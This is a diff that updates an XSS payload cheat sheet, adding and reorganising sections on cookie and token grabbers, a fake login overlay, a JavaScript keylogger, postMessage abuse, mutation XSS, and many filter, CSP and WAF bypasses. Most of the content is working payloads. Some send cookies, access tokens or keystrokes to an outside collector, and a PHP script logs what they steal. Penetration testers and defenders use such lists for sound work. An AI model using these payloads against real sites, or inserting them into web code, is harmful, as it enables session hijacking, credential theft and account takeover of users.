@@ -2,38 +2,86 @@
 
 Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.
 
+## Summary 
+
 - [Exploit code or POC](#exploit-code-or-poc)
+  - [Data grabber for XSS](#data-grabber-for-xss)
+  - [UI redressing](#ui-redressing)
+  - [Javascript keylogger](#javascript-keylogger)
+  - [Other ways](#other-ways)
 - [Identify an XSS endpoint](#identify-an-xss-endpoint)
 - [XSS in HTML/Applications](#xss-in-htmlapplications)
 - [XSS in wrappers javascript and data URI](#xss-in-wrappers-javascript-and-data-uri)
 - [XSS in files (XML/SVG/CSS/Flash/Markdown)](#xss-in-files)
+- [XSS in PostMessage](#xss-in-postmessage)
 - [Blind XSS](#blind-xss)
+  - [XSS Hunter](#xss-hunter)
+  - [Other Blind XSS tools](#other-blind-xss-tools)
+  - [Blind XSS endpoint](#blind-xss-endpoint)
+- [Mutated XSS](#mutated-xss)
 - [Polyglot XSS](#polyglot-xss)
 - [Filter Bypass and Exotic payloads](#filter-bypass-and-exotic-payloads)
+  - [Bypass case sensitive](#bypass-case-sensitive)
+  - [Bypass tag blacklist](#bypass-tag-blacklist)
+  - [Bypass word blacklist with code evaluation](#bypass-word-blacklist-with-code-evaluation)
+  - [Bypass with incomplete html tag](#bypass-with-incomplete-html-tag)
+  - [Bypass quotes for string](#bypass-quotes-for-string)
+  - [Bypass quotes in script tag](#bypass-quotes-in-script-tag)
+  - [Bypass quotes in mousedown event](#bypass-quotes-in-mousedown-event)
+  - [Bypass dot filter](#bypass-dot-filter)
+  - [Bypass parenthesis for string](#bypass-parenthesis-for-string)
+  - [Bypass parenthesis and semi colon](#bypass-parenthesis-and-semi-colon)
+  - [Bypass onxxxx= blacklist](#bypass-onxxxx---blacklist)
+  - [Bypass space filter](#bypass-space-filter)
+  - [Bypass email filter](#bypass-email-filter)
+  - [Bypass document blacklist](#bypass-document-blacklist)
+  - [Bypass using javascript inside a string](#bypass-using-javascript-inside-a-string)
+  - [Bypass using an alternate way to redirect](#bypass-unsing-an-alternate-way-to-redirect)
+  - [Bypass using an alternate way to execute an alert](#bypass-using-an-alternate-way-to-execute-an-alert)
+  - [Bypass ">" using nothing](#bypass----using-nothing)
+  - [Bypass ";" using another character](#bypass-using------using-another-character)
+  - [Bypass using HTML encoding](#bypass-using-html-encoding)
+  - [Bypass using Katana](#bypass-using-katana)
+  - [Bypass using Lontara](#bypass-using-lontara)
+  - [Bypass using ECMAScript6](#bypass-using-ecmascript6)
+  - [Bypass using Octal encoding](#bypass-using-octal-encoding)
+  - [Bypass using Unicode](#bypass-using-unicode)
+  - [Bypass using UTF-7](#bypass-using-utf---7)
+  - [Bypass using UTF-8](#bypass-using-utf---8)
+  - [Bypass using UTF-16be](#bypass-using-utf---16be)
+  - [Bypass using UTF-32](#bypass-using-utf---32)
+  - [Bypass using BOM](#bypass-using-bom)
+  - [Bypass using weird encoding or native interpretation](#bypass-using-weird-encoding-or-native-interpretation)
 - [CSP Bypass](#csp-bypass)
 - [Common WAF Bypass](#common-waf-bypass)
 
 ## Exploit code or POC
 
-Cookie grabber for XSS
+### Data grabber for XSS
+
+Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.
+
+```html
+<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
+<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
+<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
+<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
+```
+
+Write the collected data into a file.
 
 ```php
 <?php
-// How to use it
-<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
-or
-<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
-
-// Write the cookie in a file
 $cookie = $_GET['c'];
 $fp = fopen('cookies.txt', 'a+');
 fwrite($fp, 'Cookie:' .$cookie.'\r\n');
 fclose($fp);
-
 ?>
 ```
 
-UI redressing (Sophisticated phishing)
+### UI redressing 
+
+Leverage the XSS to modify the HTML content of the page in order to display a fake login form.
 
 ```html
 <script>
@@ -42,11 +90,15 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 </script>
 ```
 
-Keylogger for XSS
+### Javascript keylogger
+
+Another way to collect sensitive data is to set a javascript keylogger.
 
 ```javascript
 <img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
 ```
+
+### Other ways
 
 More exploits at [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all):
 
@@ -91,6 +143,15 @@ Svg payload
 <svg id=alert(1) onload=eval(id)>
 "><svg/onload=alert(String.fromCharCode(88,83,83))>
 "><svg/onload=alert(/XSS/)
+
+Div payload
+<div onpointerover="alert(45)">MOVE HERE</div>
+<div onpointerdown="alert(45)">MOVE HERE</div>
+<div onpointerenter="alert(45)">MOVE HERE</div>
+<div onpointerleave="alert(45)">MOVE HERE</div>
+<div onpointermove="alert(45)">MOVE HERE</div>
+<div onpointerout="alert(45)">MOVE HERE</div>
+<div onpointerup="alert(45)">MOVE HERE</div>
 ```
 
 XSS for HTML5
@@ -203,7 +264,7 @@ vbscript:msgbox("XSS")
 </name>
 ```
 
-XSS in XML
+### XSS in XML
 
 ```xml
 <html>
@@ -214,7 +275,7 @@ XSS in XML
 </html>
 ```
 
-XSS in SVG
+### XSS in SVG
 
 ```xml
 <?xml version="1.0" standalone="no"?>
@@ -228,7 +289,7 @@ XSS in SVG
 </svg>
 ```
 
-XSS in SVG (short)
+### XSS in SVG (short)
 
 ```javascript
 <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
@@ -238,7 +299,7 @@ XSS in SVG (short)
 <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
 ```
 
-XSS in Markdown
+### XSS in Markdown
 
 ```csharp
 [a](javascript:prompt(document.cookie))
@@ -247,7 +308,7 @@ XSS in Markdown
 [a](javascript:window.onerror=alert;throw%201)
 ```
 
-XSS in SWF flash application
+### XSS in SWF flash application
 
 ```powershell
 Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
@@ -257,7 +318,7 @@ IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvali
 
 more payloads in ./files
 
-XSS in SWF flash application
+### XSS in SWF flash application
 
 ```
 flashmediaelement.swf?jsinitfunctio%gn=alert`1`
@@ -278,7 +339,7 @@ flashcanvas.swf?id=test\"));}catch(e){alert(document.domain)}//
 phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domain)}//
 ```
 
-XSS in CSS
+### XSS in CSS
 
 ```html
 <!DOCTYPE html>
@@ -294,6 +355,33 @@ div  {
   <body>
     <div>lol</div>
   </body>
+</html>
+```
+
+## XSS in PostMessage
+
+> If the target origin is asterisk * the message can be sent to any domain has reference to the child page.
+
+```html
+<html>
+<body>
+    <input type=button value="Click Me" id="btn">
+</body>
+
+<script>
+document.getElementById('btn').onclick = function(e){
+    window.poc = window.open('http://www.redacted.com/#login');
+    setTimeout(function(){
+        window.poc.postMessage(
+            {
+                "sender": "accounts",
+                "url": "javascript:confirm('XSS')",
+            },
+            '*'
+        );
+    }, 2000);
+}
+</script>
 </html>
 ```
 
@@ -315,7 +403,7 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursu
 <script>$.getScript("//yoursubdomain.xss.ht")</script>
 ```
 
-### Other tools for Blind XSS
+### Other Blind XSS tools
 
 - [sleepy-puppy - Netflix](https://github.com/Netflix-Skunkworks/sleepy-puppy)
 - [bXSS - LewisArdern](https://github.com/LewisArdern/bXSS)
@@ -329,6 +417,21 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursu
 - Referer Header
   - Custom Site Analytics
   - Administrative Panel logs
+- User Agent
+  - Custom Site Analytics
+  - Administrative Panel logs
+- Comment Box
+  - Administrative Panel
+
+## Mutated XSS
+
+Use browsers quirks to recreate some HTML tags when it is inside an `element.innerHTML`.
+
+Mutated XSS from Masato Kinugawa, used against DOMPurify component on Google Search. Technical blogposts available at https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/ and https://research.securitum.com/dompurify-bypass-using-mxss/.
+
+```javascript
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+```
 
 ## Polyglot XSS
 
@@ -406,20 +509,20 @@ javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></
 
 ## Filter Bypass and exotic payloads
 
-Bypass case sensitive
+### Bypass case sensitive
 
 ```javascript
 <sCrIpt>alert(1)</ScRipt>
 ```
 
-Bypass tag blacklist
+### Bypass tag blacklist
 
 ```javascript
 <script x>
 <script x>alert('XSS')<script y>
 ```
 
-Bypass word blacklist with code evaluation
+### Bypass word blacklist with code evaluation
 
 ```javascript
 eval('ale'+'rt(0)');
@@ -431,19 +534,21 @@ Set.constructor('ale'+'rt(13)')();
 Set.constructor`al\x65rt\x2814\x29```;
 ```
 
-Bypass with incomplete html tag - IE/Firefox/Chrome/Safari
+### Bypass with incomplete html tag 
+
+Works on IE/Firefox/Chrome/Safari
 
 ```javascript
 <img src='1' onerror='alert(0)' <
 ```
 
-Bypass quotes for string
+### Bypass quotes for string
 
 ```javascript
 String.fromCharCode(88,83,83)
 ```
 
-Bypass quotes in script tag
+### Bypass quotes in script tag
 
 ```javascript
 http://localhost/bla.php?test=</script><script>alert(1)</script>
@@ -454,77 +559,88 @@ http://localhost/bla.php?test=</script><script>alert(1)</script>
 </html>
 ```
 
-Bypass quotes in mousedown event
+### Bypass quotes in mousedown event
+
+You can bypass a single quote with &#39; in an on mousedown event handler
 
 ```javascript
 <a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
-
-You can bypass a single quote with &#39; in an on mousedown event handler
 ```
 
-Bypass dot filter
+### Bypass dot filter
 
 ```javascript
 <script>window['alert'](document['domain'])</script>
 ```
 
-Bypass parenthesis for string - Firefox/Opera
+Convert IP address into decimal format: IE. `http://192.168.1.1` == `http://3232235777`
+http://www.geektools.com/cgi-bin/ipconv.cgi
+
+### Bypass parenthesis for string
 
 ```javascript
 alert`1`
 setTimeout`alert\u0028document.domain\u0029`;
 ```
 
-Bypass onxxxx= blacklist
+### Bypass parenthesis and semi colon
+
+```javascript
+// From @garethheyes
+<script>onerror=alert;throw 1337</script>
+<script>{onerror=alert}throw 1337</script>
+<script>throw onerror=alert,'some string',123,'haha'</script>
+
+// From @terjanq 
+<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
+
+// From @cgvwzq
+<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
+```
+
+### Bypass onxxxx= blacklist
 
 ```javascript
 <object onafterscriptexecute=confirm(0)>
 <object onbeforescriptexecute=confirm(0)>
-```
 
-Bypass onxxx= filter with a null byte/vertical tab - IE/Safari
-
-```javascript
+// Bypass onxxx= filter with a null byte/vertical tab
 <img src='1' onerror\x00=alert(0) />
 <img src='1' onerror\x0b=alert(0) />
-```
 
-Bypass onxxx= filter with a '/' - IE/Firefox/Chrome/Safari
-
-```javascript
+// Bypass onxxx= filter with a '/' 
 <img src='1' onerror/=alert(0) />
 ```
 
-Bypass space filter with "/" - IE/Firefox/Chrome/Safari
+### Bypass space filter
 
 ```javascript
+// Bypass space filter with "/"
 <img/src='1'/onerror=alert(0)>
-```
 
-Bypass space filter with 0x0c/^L
-
-```javascript
+// Bypass space filter with 0x0c/^L
 <svgonload=alert(1)>
-
 
 $ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
 00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  <svg.onload.=.al
 00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
 ```
 
-Bypass email filter ([RFC compliant](http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate))
+### Bypass email filter 
+
+([RFC compliant](http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate))
 
 ```javascript
 "><svg/onload=confirm(1)>"@x.y
 ```
 
-Bypass document blacklist
+### Bypass document blacklist
 
 ```javascript
 <div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>
 ```
 
-Bypass using javascript inside a string
+### Bypass using javascript inside a string
 
 ```javascript
 <script>
@@ -532,7 +648,7 @@ foo="text </script><script>alert(1)</script>";
 </script>
 ```
 
-Bypass using an alternate way to redirect
+### Bypass using an alternate way to redirect
 
 ```javascript
 location="http://google.com"
@@ -542,7 +658,9 @@ window.location.assign("http://google.com")
 window['location']['href']="http://google.com"
 ```
 
-Bypass using an alternate way to execute an alert - [@brutelogic](https://twitter.com/brutelogic/status/965642032424407040)
+### Bypass using an alternate way to execute an alert
+
+From [@brutelogic](https://twitter.com/brutelogic/status/965642032424407040) tweet.
 
 ```javascript
 window['alert'](0)
@@ -561,7 +679,40 @@ content['alert'](6)
 [12].forEach(alert);
 ```
 
-Bypass using an alternate way to execute an alert - [@quanyang](https://twitter.com/quanyang/status/1078536601184030721)
+From [@theMiddle](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/) - Using global variables
+
+The Object.keys() method returns an array of a given object's own property names, in the same order as we get with a normal loop. That's means that we can access any JavaScript function by using its **index number instead the function name**.
+
+```javascript
+c=0; for(i in self) { if(i == "alert") { console.log(c); } c++; }
+// 5
+```
+
+Then calling alert is :
+
+```javascript
+Object.keys(self)[5]
+// "alert"
+self[Object.keys(self)[5]]("1") // alert("1")
+```
+
+We can find "alert" with a regular expression like ^a[rel]+t$ : 
+
+```javascript
+a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} //bind function alert on new function a()
+
+// then you can use a() with Object.keys
+
+self[Object.keys(self)[a()]]("1") // alert("1")
+```
+
+Oneliner: 
+```javascript
+a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]]("1")
+```
+
+From [@quanyang](https://twitter.com/quanyang/status/1078536601184030721) tweet.
+
 ```javascript
 prompt`${document.domain}`
 document.location='java\tscript:alert(1)'
@@ -569,7 +720,7 @@ document.location='java\rscript:alert(1)'
 document.location='java\tscript:alert(1)'
 ```
 
-Bypass using an alternate way to execute an alert - [@404death](https://twitter.com/404death/status/1011860096685502464)
+From [@404death](https://twitter.com/404death/status/1011860096685502464) tweet.
 
 ```javascript
 eval('ale'+'rt(0)');
@@ -616,13 +767,15 @@ XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
 XSSObject.proxy(window, 'alert', 'window.alert', false);
 ```
 
-Bypass ">" using nothing #trololo (you don't need to close your tags)
+### Bypass ">" using nothing 
+
+You don't need to close your tags.
 
 ```javascript
 <svg onload=alert(1)//
 ```
 
-Bypass ';' using another character
+### Bypass ";" using another character
 
 ```javascript
 'te' * alert('*') * 'xt';
@@ -642,31 +795,43 @@ Bypass ';' using another character
 'te' instanceof alert('instanceof') instanceof 'xt';
 ```
 
-Bypass using HTML encoding
+### Bypass using HTML encoding
 
 ```javascript
 %26%2397;lert(1)
+&#97;&#108;&#101;&#114;&#116;
+></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
 ```
 
-Bypass using [Katakana](https://github.com/aemkei/katakana.js)
+### Bypass using Katana
+
+Using the [Katakana](https://github.com/aemkei/katakana.js) library.
 
 ```javascript
 javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
 ```
 
-Bypass using ECMAScript6 variation:
+### Bypass using Lontara
 
+```javscript
+ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()
 ```
+
+More alphabets on http://aem1k.com/aurebesh.js/#
+
+### Bypass using ECMAScript6
+
+```html
 <script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>
 ```
 
-Bypass using Octal encoding
+### Bypass using Octal encoding
 
 ```javascript
 javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'
 ```
 
-Bypass using Unicode
+### Bypass using Unicode
 
 ```javascript
 Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was
@@ -704,7 +869,13 @@ Bypass using Unicode converted to uppercase
 <ıframe id=x onload=>.toUpperCase() become <IFRAME ID=X ONLOAD=>
 ```
 
-Bypass using overlong UTF-8
+### Bypass using UTF-7
+
+```javascript
++ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
+```
+
+### Bypass using UTF-8
 
 ```javascript
 < = %C0%BC = %E0%80%BC = %F0%80%80%BC
@@ -715,26 +886,22 @@ Bypass using overlong UTF-8
 ' = %CA%B9
 ```
 
-Bypass using UTF-7
-
-```javascript
-+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
-```
-
-Bypass using UTF-16be
+### Bypass using UTF-16be
 
 ```javascript
 %00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00
 \x00<\x00s\x00v\x00g\x00/\x00o\x00n\x00l\x00o\x00a\x00d\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x00)\x00>
 ```
 
-Bypass using UTF-32
+### Bypass using UTF-32
 
 ```js
 %00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
 ```
 
-Bypass using BOM - Byte Order Mark (The page must begin with the BOM character.)
+### Bypass using BOM
+
+Byte Order Mark (The page must begin with the BOM character.)
 BOM character allows you to override charset of the page
 
 ```js
@@ -749,8 +916,7 @@ Little Endian : 0xFF 0xFE 0x00 0x00
 XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
 ```
 
-
-Bypass using weird encoding or native interpretation to hide the payload (alert())
+### Bypass using weird encoding or native interpretation 
 
 ```javascript
 <script>\u0061\u006C\u0065\u0072\u0074(1)</script>
@@ -760,26 +926,9 @@ Bypass using weird encoding or native interpretation to hide the payload (alert(
 <script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
 ```
 
-Exotic payloads
-
-```javascript
-<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
-<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
-<script>$=1,alert($)</script>
-<script ~~~>confirm(1)</script ~~~>
-<script>$=1,\u0061lert($)</script>
-<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
-<</script/script><script ~~~>\u0061lert(1)</script ~~~>
-</style></scRipt><scRipt>alert(1)</scRipt>
-<img/id="alert&lpar;&#x27;XSS&#x27;&#x29;\"/alt=\"/\"src=\"/\"onerror=eval(id&#x29;>
-<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
-<svg><x><script>alert&#40;&#39;1&#39;&#41</x>
-<iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
-```
-
 ## CSP Bypass
 
-Check the CSP on [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) and the post : [How to use Google’s CSP Evaluator to bypass CSP](https://blog.thomasorlita.cz/vulns/google-csp-evaluator/)
+Check the CSP on [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) and the post : [How to use Google’s CSP Evaluator to bypass CSP](https://appio.dev/vulns/google-csp-evaluator/)
 
 ### Bypass CSP using JSONP from Google (Trick by [@apfeifer27](https://twitter.com/apfeifer27))
 
@@ -815,7 +964,24 @@ Works for CSP like `script-src self`
 <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
 ```
 
+### Bypass CSP by [@404death](https://twitter.com/404death/status/1191222237782659072)
+
+Works for CSP like `script-src 'self' data:`
+
+```javascript
+<script ?/src="data:+,\u0061lert%281%29">/</script>
+```
+
+
 ## Common WAF Bypass
+
+### Cloudflare XSS Bypasses by [@Bohdan Korzhynskyi](https://twitter.com/h1_ragnar) - 3rd june 2019
+
+```html
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
+xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+```
 
 ### Cloudflare XSS Bypass - 22nd march 2019 (by @RakeshMane10)
 
@@ -851,6 +1017,11 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 <object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
 ```
 
+### Incapsula WAF Bypass by [@daveysec](https://twitter.com/daveysec/status/1126999990658670593) - 11th may 2019
+
+```html
+<svg onload\r\n=$.globalEval("al"+"ert()");>
+```
 
 ### Akamai WAF Bypass by [@zseano](https://twitter.com/zseano) - 18th june 2018
 
@@ -870,18 +1041,6 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 <a href=javas&#99;ript:alert(1)>
 ```
 
-## More fun
-
-This section will be used for the "fun/interesting/useless" stuff.
-
-Use notification box instead of an alert - by [@brutelogic](https://twitter.com/brutelogic)
-Note : it requires user permission
-
-```javascript
-Notification.requestPermission(x=>{new(Notification)(1)})
-```
-
-Try here : [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?c3=%27;Notification.requestPermission(x=>%7Bnew(Notification)(1)%7D)//)
 
 ## References
 
@@ -903,7 +1062,6 @@ Try here : [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php
 - [Three Stored XSS in Facebook](http://www.breaksec.com/?p=6129) by Nirgoldshlager 
 - [Using a Braun Shaver to Bypass XSS Audit and WAF](https://blog.bugcrowd.com/guest-blog-using-a-braun-shaver-to-bypass-xss-audit-and-waf-by-frans-rosen-detectify) by Frans Rosen  
 - [An XSS on Facebook via PNGs & Wonky Content Types](https://whitton.io/articles/xss-on-facebook-via-png-content-types/) by Jack Whitton
-  - he is able to make stored XSS from a irrelevant domain to main facebook domain 
 - [Stored XSS in *.ebay.com](https://whitton.io/archive/persistent-xss-on-myworld-ebay-com/) by Jack Whitton
 - [Complicated, Best Report of Google XSS](https://sites.google.com/site/bughunteruniversity/best-reports/account-recovery-xss) by Ramzes
 - [Tricky Html Injection and Possible XSS in sms-be-vip.twitter.com](https://hackerone.com/reports/150179) by secgeek
@@ -934,6 +1092,7 @@ Try here : [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php
 - [How I found a $5,000 Google Maps XSS (by fiddling with Protobuf)](https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff#.cktt61q9g) by Marin MoulinierFollow
 - [Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities](https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/) by Brett 
